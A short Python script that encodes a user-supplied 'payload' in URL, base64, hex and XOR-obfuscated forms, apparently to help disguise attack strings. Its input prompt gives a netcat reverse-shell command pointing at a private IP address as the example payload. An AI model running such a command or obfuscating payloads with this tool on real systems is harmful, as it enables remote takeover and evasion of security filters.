import base64
import urllib.parse

def encode_payload(payload):
    encoded_versions = {}

    # URL encode
    encoded_versions['url_encoded'] = urllib.parse.quote(payload)

    # Base64 encode (UTF-8 bytes)
    encoded_versions['base64_encoded'] = base64.b64encode(payload.encode()).decode()

    # Hex encode
    encoded_versions['hex_encoded'] = payload.encode().hex()

    # XOR Encode (simple key-based obfuscation)
    key = 0x42
    xor_encoded = ''.join(f'\\x{ord(c) ^ key:02x}' for c in payload)
    encoded_versions['xor_encoded'] = xor_encoded

    return encoded_versions

# Example usage
if __name__ == "__main__":
    raw = input("Enter raw payload (eg. nc -e /bin/sh 192.168.1.10 4444): ").strip()
    result = encode_payload(raw)

    print("\n== Encoded Versions ==")
    for method, output in result.items():
        print(f"[{method}]")
        print(f"  {output}\n")